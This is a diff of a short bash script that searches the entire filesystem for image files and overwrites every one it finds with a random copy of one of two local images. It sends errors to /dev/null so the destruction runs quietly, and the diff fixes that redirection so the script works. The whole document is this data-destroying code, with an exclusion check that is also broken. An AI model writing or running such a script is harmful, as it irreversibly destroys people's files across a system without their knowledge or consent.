@@ -9,14 +9,14 @@ excluded_images=("$(pwd)/image.jpg" "$(pwd)/image1.jpg")
 
 
 # Find all image files on the system
-image_files=$(find / -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" \)) 2>dev/null
+image_files=$(find / -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" \)) 2>/dev/null
 
 # Loop through all image files and replace them with a random choice from replacement_images
 for image_file in $image_files
 do
 	if [[ "$image_file" != *"#excluded_images"* ]]; then 
     		replacement_image=${excluded_images[$RANDOM % ${#excluded_images[@]}]}
-    		cp "$replacement_image" "$image_file" 2>dev/null
+    		cp "$replacement_image" "$image_file" 2>/dev/null
     
     	fi
 done
